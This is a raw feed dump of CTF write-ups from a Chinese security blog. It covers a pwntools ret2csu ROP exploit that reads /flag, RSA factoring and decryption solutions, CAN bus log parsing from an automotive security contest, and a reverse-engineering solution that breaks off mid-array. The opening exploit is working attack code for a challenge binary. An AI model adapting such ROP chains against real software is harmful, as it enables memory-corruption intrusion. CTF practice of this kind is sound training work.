elf_base()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;elf--&gt;&quot;</span> + <span class="hljs-built_in">hex</span>(elf.address))<br><br>csu1 = elf.address + <span class="hljs-number">0x1620</span><br>csu2 = elf.address + <span class="hljs-number">0x163a</span><br><br>offset = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x38</span><br><br><span class="hljs-comment"># Craft the ROP chain</span><br>rop_chain = [<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>], <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">257</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, elf.address + <span class="hljs-number">0x4280</span> + <span class="hljs-number">0x30</span>, <span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<br>    csu1, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    csu2, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, elf.address + <span class="hljs-number">0x4280</span>, <span class="hljs-number">0x30</span>, elf.got[<span class="hljs-string">&#x27;close&#x27;</span>],<br>    csu1<br>]<br><br><br>payload = <span class="hljs-string">b&#x27;&#x27;</span>.join([p64(addr) <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> rop_chain])<br><br><br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.sendline(offset + payload)<br>p.send(<span class="hljs-string">b&#x27;\x15&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;/flag&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">257</span> - <span class="hljs-number">5</span>))<br>p.send(<span class="hljs-string">b&#x27;\x00&#x27;</span> * <span class="hljs-number">1</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="GeneratePrime"><a href="#GeneratePrime" class="headerlink" title="GeneratePrime"></a>GeneratePrime</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>n=<span class="hljs-number">43090231453250894711427929679917165532091051269639380881822679198388872373018031295429558758883298138388596507242928145888959963579111847255588834248367032580980272245414738073179172684104908272069503607376171584936239696444309039211273376010193165083254209608051430794825261116490356392215410064858020176711199543381037420111454942356936721487016187240237683725310306748046587503625096246489043270381153251813360521583717685413070481576320194446237522118380283335294528606720928637529817170809666802598938788405154468683850385277659812316577873886708164549255359514776884765904417881419804464020855420288884972204146588152412816874161445668955639456202226751519881834234916642218078966066353317917939418964763844067220460513388433020071277477619189495465483910271310025371745344364984826481983188861624474015117761898377237745775289039922285111681410319016537270412509750339539020876501534842403407208957382830000761065368861209033791387480377889838737241326116532852335478193204425626487166234964754732945953080086117315162916374952094149599597509405176646068341218684523765974759907645226607364627690026025662221036766148813918691578120023886400197652148214238256715089883892069133754778609710846757189987335827693169644541734443763194942694587436469448973201513131503797898892822373949177030567791519349220158287318717788746060997955057747930375117780320371517616412423571775682868481089431670802944047375824503353609019686495670630728618082254293585479431369645935654024149490741245953271830453426444847467908952699660750809490650479987</span><br>e=<span class="hljs-number">65537</span><br>c=<span class="hljs-number">30862228874892553476569860337345503267926249096036551213683005116620750680365154103242717714230966827288361499342464202425467642950081816675486231250411347472976482409360391136808439034217688010072648722396312121758844966972323513456884732046270240934002095706243044210312663525491282667971502534420245427643076262414036655243117610886157895994101178663474990136516153062956803591842233732498519246731337518545018734984319536536205092573418457928952414660837594265802406473201400259189950484841504227372735345451459452313825309333631615286962304963039625162366186574440146535361888708570569938418676320446653266676364765870547213167058713058609788316647593834008151805692510044158607162858906528913516242904419457446211348504248317409844426309455978985314882123424453618672960876022996245213882467954521212481418830104602302179759479012618982228223244131619557639469872139485197176384683400796204681045965981417650462297978265085323342772310690638049411549216990505001950512428646871875659468885490055363436412364532718888124906227240501145227269727887236864060558999336443165765870556727793253297515155026234234422303238380776900105115890363548589834345888430695886678231459920101695996112312269637459823479947618045447071359886515163416153117176539752947700226596291435270282598638974889205601333097978743387412651687356072223691445472690647184292120882095587563356691450107194982597794937293154289560470269606300576216128045797481404606810315677962659136641943747123985144899464108823536597185386155005111274476874957827391438859327653936</span><br>k = <span class="hljs-number">5</span><br><br>R = Zmod(n)[<span class="hljs-string">&quot;x&quot;</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    Q = R.quo(R.random_element(k))<br>    pp = gcd(ZZ(<span class="hljs-built_in">list</span>(Q.random_element() ^ n)[<span class="hljs-number">1</span>]), n)<br>    <span class="hljs-keyword">if</span> pp != <span class="hljs-number">1</span>:<br>        qq = <span class="hljs-built_in">sum</span>([pp**i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(k)])<br>        rr = n // (pp * qq)<br>        <span class="hljs-keyword">assert</span> n == pp * qq * rr<br>        <span class="hljs-keyword">break</span><br>phi = (pp - <span class="hljs-number">1</span>) * (qq - <span class="hljs-number">1</span>) * (rr - <span class="hljs-number">1</span>)<br>d = <span class="hljs-built_in">pow</span>(e, -<span class="hljs-number">1</span>, phi)<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(m)))<br><br><span class="hljs-comment">#DASCTF&#123;just_a_very_very_easy_task_with_your_talent_is_not&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DASCTF月赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>车联网安全锦标赛</title>
    <link href="/2023/11/24/2023%E5%85%A8%E5%9B%BD%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2023/11/24/2023%E5%85%A8%E5%9B%BD%E6%99%BA%E8%83%BD%E9%A9%BE%E9%A9%B6%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>车联网的题目太少了，其中还有一个是原题，另一个也只是简单的CAN报文分析，抽象脑洞题目太多，当然最后中国移动毫无疑问的的拿走冠军😂简单写一下和车有关系的两个题目，另一个蓝牙流量的题目改天写个专题（挖坑；其他的题目没什么好写的）[写完了😝]</p><h2 id="CAN-RSA"><a href="#CAN-RSA" class="headerlink" title="CAN RSA"></a>CAN RSA</h2><p>感觉每次CAN报文的密码题都是一模一样的）难绷<br>解数据包，直接拿#2开头的后七字节拼起来即可，参考：<br><a href="https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf">https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf</a><br>解出来是一个RSA的PEM公钥，但后面部分被Corrupt，而且用Crypto.PublicKey解不出来，于是手撕一下，参考：<br><a href="https://tover.xyz/p/pem-by-hand/#RSA%E5%85%AC%E9%92%A5">https://tover.xyz/p/pem-by-hand/#RSA%E5%85%AC%E9%92%A5</a><br>解出来的N放在factorDB上可以分解，顺便搜了一下可以找到e，参考：<br><a href="https://github.com/RsaCtfTool/RsaCtfTool/issues/304">https://github.com/RsaCtfTool/RsaCtfTool/issues/304</a><br>最后解密即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># https://archives.sector.ca/presentations17/Eric-Evenchick-REAutoDiag.pdf</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    fr = f.read()<br>data = [x.split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">2</span>].split(<span class="hljs-string">&#x27;#&#x27;</span>)[<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> fr.split(<span class="hljs-string">&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>]][<span class="hljs-number">10</span>: -<span class="hljs-number">4</span>]<br><span class="hljs-comment">#data = &#x27;&#x27;.join([x[2:].split(&#x27;7D&#x27;)[0] for x in data])</span><br>key = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>    <span class="hljs-comment">#print(i, data[i], bytes.fromhex(data[i][2:]))</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;7D&#x27;</span> <span class="hljs-keyword">in</span> data[i]:<br>        tmp = data[i].split(<span class="hljs-string">&#x27;7D&#x27;</span>)   <span class="hljs-comment"># ????</span><br>        key += tmp[<span class="hljs-number">0</span>][<span class="hljs-number">2</span>:] + <span class="hljs-string">&#x27;4242&#x27;</span> + tmp[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        key += data[i][<span class="hljs-number">2</span>:]<br><br><span class="hljs-keyword">import</span> base64<br>key = <span class="hljs-built_in">bytes</span>.fromhex(key)<br><span class="hljs-comment">#print(key.decode())</span><br><span class="hljs-comment">#print(base64.b64decode(b&#x27;&#x27;.join(key.split(b&#x27;\n&#x27;)[1:-1])).hex())</span><br><br>n = <span class="hljs-number">460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597</span><br><span class="hljs-comment"># factorDB</span><br>p = <span class="hljs-number">15991846970993213322072626901560749932686325766403404864023341810735319249066370916090640926219079368845510444031400322229147771682961132420481897362843199</span><br>q = <span class="hljs-number">28805791771260259486856902729020438686670354441296247148207862836064657849735343618207098163901787287368569768472521344635567334299356760080507454640207003</span><br><span class="hljs-keyword">assert</span> p * q == n<br><br><span class="hljs-comment"># https://github.com/RsaCtfTool/RsaCtfTool/issues/304</span><br>e = <span class="hljs-number">354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619</span><br><br>c = <span class="hljs-number">49204714858589959506425439175649050431712689077552080337419353493097408019421214668787900602380476464749282877075822584378756221224722944848685142270406954588911362016685713099949058708493084032575436033859064998703946175169856560687276793237892152502134788316092552043085946089668969326209343517732349235471</span><br><br><span class="hljs-keyword">import</span> libnum<br>d = libnum.invmod(e, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>m = <span class="hljs-built_in">pow</span>(c, d, n)<br>flag = libnum.n2s(m)<br><span class="hljs-comment">#print(d)</span><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment">#b&#x27;fk32mhjlyr9pfamg97999c6b07a8ce82Hds5XEUIqFw8ZR4NLM0lPjtBGT3cDJhmen&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="can通信三字经"><a href="#can通信三字经" class="headerlink" title="can通信三字经"></a>can通信三字经</h2><p>首先将所有相同CAN ID的报文连在一起，发现，CAN ID为911的报文有所需数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 正则表达式匹配数据</span><br>log_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;^\(\d+\.\d+\)\s+can1\s+([\dA-F]&#123;3&#125;)#([0-9A-F]*)$&#x27;</span>)<br><br>can_data = &#123;&#125;<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        line = line.strip()  <span class="hljs-comment"># 去除行尾的换行符</span><br>        <span class="hljs-keyword">match</span> = log_pattern.<span class="hljs-keyword">match</span>(line)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            can_id, data = <span class="hljs-keyword">match</span>.groups()<br>            <span class="hljs-comment"># 只合并非全零的数据帧</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">all</span>(c == <span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data):<br>                <span class="hljs-keyword">if</span> can_id <span class="hljs-keyword">in</span> can_data:<br>                    can_data[can_id] += data<br>                <span class="hljs-keyword">else</span>:<br>                    can_data[can_id] = data<br><br><span class="hljs-comment"># 现在打印输出</span><br><span class="hljs-keyword">for</span> can_id <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(can_data.keys()):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;CAN ID <span class="hljs-subst">&#123;can_id&#125;</span>: <span class="hljs-subst">&#123;can_data[can_id]&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>将data区6个字节提取出来，转换成字符串即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 正则表达式匹配带有特定CAN ID和数据后缀为03的记录</span><br><span class="hljs-comment"># 假定数据记录格式为：&quot;(timestamp) can1 911#03XXXXXX&quot;，其中X是我们需要的字节</span><br>log_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;\(.*?\)\s+can1\s+911#03([0-9A-F]&#123;6&#125;)&#x27;</span>, re.IGNORECASE)<br><br><span class="hljs-comment"># 存储匹配字节的列表</span><br>matched_bytes = []<br><br><span class="hljs-comment"># 读取文件内容</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;candump.log&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>        <span class="hljs-keyword">match</span> = log_pattern.search(line.strip())<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            <span class="hljs-comment"># 添加匹配的字节（后三个字节数据）</span><br>            matched_bytes.append(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># 将所有匹配的字节拼接成一个字符串</span><br>combined_hex = <span class="hljs-string">&#x27;&#x27;</span>.join(matched_bytes)<br><br><span class="hljs-comment"># 将十六进制字符串转换成ASCII格式的字符串</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_to_ascii</span>(<span class="hljs-params">hex_string</span>):<br>    ascii_string = <span class="hljs-built_in">bytearray</span>.fromhex(hex_string).decode()<br>    <span class="hljs-keyword">return</span> ascii_string<br><br>combined_ascii = hex_to_ascii(combined_hex)<br><br><span class="hljs-comment"># 输出原始拼接的十六进制数据和对应的ASCII字符串</span><br><span class="hljs-comment">#print(f&quot;Combined hex data: &#123;combined_hex&#125;&quot;)</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Combined ASCII data: <span class="hljs-subst">&#123;combined_ascii&#125;</span>&quot;</span>)<br><br><span class="hljs-comment">#Combined ASCII data: flag_len:s39f1dll9f4hb6aya9djyig008cb8306703ac96Dar</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IoV</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023鹏城杯初赛</title>
    <link href="/2023/11/04/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/"/>
    <url>/2023/11/04/2023%E9%B9%8F%E5%9F%8E%E6%9D%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="安全编程"><a href="#安全编程" class="headerlink" title="安全编程"></a>安全编程</h2><p><img src="/mdimg/2023pcb/1.png"><br>修复文件头即可</p><h2 id="BabyRe"><a href="#BabyRe" class="headerlink" title="BabyRe"></a>BabyRe</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python">rand = [<span class="hljs-number">19954</span>,<span class="hljs-number">28965</span>,<span class="hljs-number">14137</span>,<span class="hljs-number">3558</span>,<span class="hljs-number">10069</span>,<span class="hljs-number">31251</span>,<span class="hljs-number">32362</span>,<span class="hljs-number">11940</span>,<span class="hljs-number">3430</span>,<span class="hljs-number">27969</span>,<span class="hljs-number">14847</span>,<span class="hljs-number">11465</span>,<span class="hljs-number">12175</span>,<span class="hljs-number">9021</span>,<span class="hljs-number">27614</span>,<span class="hljs-number">8175</span>,<span class="hljs-number">12050</span>,<span class="hljs-number">16408</span>,<span class="hljs-number">20581</span>,<span class="hljs-number">6478</span>,<span class="hljs-number">17749</span>,<span class="hljs-number">4203</span>,<span class="hljs-number">22364</span>,<span class="hljs-number">2272</span>,<span class="hljs-number">9340</span>,<span class="hljs-number">14232</span>,<span class="hljs-number">10535</span>,<span class="hljs-number">32196</span>,<span class="hljs-number">17981</span>,<span class="hljs-number">4946</span>,<span class="hljs-number">3136</span>,<span class="hljs-number">17889</span>,<span class="hljs-number">7408</span>,<span class="hljs-number">30816</span>,<span class="hljs-number">16101</span>,<span class="hljs-number">12491</span>,<span class="hljs-number">23270</span>,<span class="hljs-number">11421</span>,<span class="hljs-number">6414</span>,<span class="hljs-number">31210</span>,<span class="hljs-number">17404</span>,<span class="hljs-number">16964</span>,<span class="hljs-number">2722</span>,<span class="hljs-number">7641</span>,<span class="hljs-number">15728</span>,<span class="hljs-number">14442</span>,<span class="hljs-number">18922</span>,<span class="hljs-number">7948</span>,<span class="hljs-number">4083</span>,<span class="hljs-number">1228</span>,<span class="hljs-number">17990</span>,<span class="hljs-number">32182</span>,<span class="hljs-number">4095</span>,<span class="hljs-number">27339</span>,<span class="hljs-number">13087</span>,<span class="hljs-number">26345</span>,<span class="hljs-number">8298</span>,<span class="hljs-number">17333</span>,<span class="hljs-number">16156</span>,<span class="hljs-number">24319</span>,<span class="hljs-number">17212</span>,<span class="hljs-number">7238</span>,<span class="hljs-number">19353</span>,<span class="hljs-number">27450</span>,<span class="hljs-number">11454</span>,<span class="hljs-number">19311</span>,<span class="hljs-number">14421</span>,<span class="hljs-number">32423</span>,<span class="hljs-number">3283</span>,<span class="hljs-number">26197</span>,<span class="hljs-number">5994</span>,<span class="hljs-number">11848</span>,<span class="hljs-number">651</span>,<span class="hljs-number">13725</span>,<span class="hljs-number">23939</span>,<span class="hljs-number">28785</span>,<span class="hljs-number">28150</span>,<span class="hljs-number">4071</span>,<span class="hljs-number">25161</span>,<span class="hljs-number">27507</span>,<span class="hljs-number">5174</span>,<span class="hljs-number">15768</span>,<span class="hljs-number">17694</span>,<span class="hljs-number">6008</span>,<span class="hljs-number">18904</span>,<span class="hljs-number">18909</span>,<span class="hljs-number">2574</span>,<span class="hljs-number">14254</span>,<span class="hljs-number">5989</span>,<span class="hljs-number">25837</span>,<span class="hljs-number">770</span>,<span class="hljs-number">28328</span>,<span class="hljs-number">3123</span>,<span class="hljs-number">15246</span>,<span class="hljs-number">22839</span>,<span class="hljs-number">29185</span>,<span class="hljs-number">13185</span>,<span class="hljs-number">26586</span>,<span class="hljs-number">19183</span>,<span class="hljs-number">8514</span>,<span class="hljs-number">24515</span>,<span class="hljs-number">24387</span>,<span class="hljs-number">29031</span>,<span class="hljs-number">1029</span>,<span class="hljs-number">16443</span>,<span class="hljs-number">469</span>,<span class="hljs-number">8968</span>,<span class="hljs-number">29531</span>,<span class="hljs-number">29897</span>,<span class="hljs-number">11963</span>,<span class="hljs-number">17889</span>,<span class="hljs-number">29292</span>,<span class="hljs-number">5124</span>,<span class="hljs-number">517</span>,<span class="hljs-number">9813</span>,<span class="hljs-number">31325</span>,<span class="hljs-number">22409</span>,<span class="hljs-number">8104</span>,<span class="hljs-number">9745</span>,<span class="hljs-number">15735</span>,<span class="hljs-number">25236</span>,<span class="hljs-number">12230</span>,<span class="hljs-number">22338</span>,<span class="hljs-number">9605</span>,<span class="hljs-number">22221</span>,<span class="hljs-number">28720</span>,<span class="hljs-number">22532</span>,<span class="hljs-number">4477</span>,<span class="hljs-number">11108</span>,<span class="hljs-number">32554</span>,<span class="hljs-number">541</span>,<span class="hljs-number">5731</span>,<span class="hljs-number">31327</span>,<span class="hljs-number">17262</span>,<span class="hljs-number">17131</span>,<span class="hljs-number">18283</span>,<span class="hljs-number">14387</span>,<span class="hljs-number">5491</span>,<span class="hljs-number">12187</span>,<span class="hljs-number">18782</span>,<span class="hljs-number">2450</span>,<span class="hljs-number">3566</span>,<span class="hljs-number">10652</span>,<span class="hljs-number">13630</span>,<span class="hljs-number">11141</span>,<span class="hljs-number">7578</span>,<span class="hljs-number">10067</span>,<span class="hljs-number">3629</span>,<span class="hljs-number">8634</span>,<span class="hljs-number">21044</span>,<span class="hljs-number">29969</span>,<span class="hljs-number">20107</span>,<span class="hljs-number">7967</span>,<span class="hljs-number">27850</span>,<span class="hljs-number">578</span>,<span class="hljs-number">20575</span>,<span class="hljs-number">23728</span>,<span class="hljs-number">11574</span>,<span class="hljs-number">3815</span>,<span class="hljs-number">5368</span>,<span class="hljs-number">21132</span>,<span class="hljs-number">30438</span>,<span class="hljs-number">19782</span>,<span class="hljs-number">12244</span>,<span class="hljs-number">1871</span>,<span class="hljs-number">13022</span>,<span class="hljs-number">19423</span>,<span class="hljs-number">22720</span>,<span class="hljs-number">27036</span>,<span class="hljs-number">4863</span>,<span class="hljs-number">15267</span>,<span class="hljs-number">26945</span>,<span class="hljs-number">26617</span>,<span class="hljs-number">6793</span>,<span class="hljs-number">26209</span>,<span class="hljs-number">18739</span>,<span class="hljs-number">15072</span>,<span class="hljs-number">4063</span>,<span class="hljs-number">27009</span>,<span class="hljs-number">3760</span>,<span class="hljs-number">5394</span>,<span class="hljs-number">15242</span>,<span class="hljs-number">2292</span>,<span class="hljs-number">21811</span>,<span class="hljs-number">11823</span>,<span class="hljs-number">6273</span>,<span class="hljs-number">11883</span>,<span class="hljs-number">4093</span>,<span class="hljs-number">23428</span>,<span class="hljs-number">22951</span>,<span class="hljs-number">26823</span>,<span class="hljs-number">23480</span>]<br>msg = [<span class="hljs-number">72</span>,  <span class="hljs-number">77</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">160</span>,  <span class="hljs-number">39</span>,  <span class="hljs-number">49</span>,  <span class="hljs-number">40</span>,  <span class="hljs-number">84</span>, <span class="hljs-number">109</span>, <span class="hljs-number">241</span>,<br>   <span class="hljs-number">33</span>,  <span class="hljs-number">53</span>,  <span class="hljs-number">24</span>, <span class="hljs-number">115</span>, <span class="hljs-number">106</span>,  <span class="hljs-number">76</span>, <span class="hljs-number">113</span>,  <span class="hljs-number">59</span>, <span class="hljs-number">189</span>, <span class="hljs-number">152</span>,<br>  <span class="hljs-number">182</span>,  <span class="hljs-number">90</span>, <span class="hljs-number">119</span>,  <span class="hljs-number">45</span>,  <span class="hljs-number">11</span>,  <span class="hljs-number">43</span>, <span class="hljs-number">203</span>, <span class="hljs-number">155</span>, <span class="hljs-number">228</span>, <span class="hljs-number">138</span>,<br>   <span class="hljs-number">76</span>, <span class="hljs-number">169</span>,  <span class="hljs-number">92</span>,  <span class="hljs-number">79</span>,  <span class="hljs-number">27</span>, <span class="hljs-number">241</span>, <span class="hljs-number">152</span>,  <span class="hljs-number">61</span>,  <span class="hljs-number">48</span>,  <span class="hljs-number">89</span>,<br>   <span class="hljs-number">63</span>,  <span class="hljs-number">20</span>, <span class="hljs-number">252</span>, <span class="hljs-number">122</span>, <span class="hljs-number">244</span>, <span class="hljs-number">100</span>,   <span 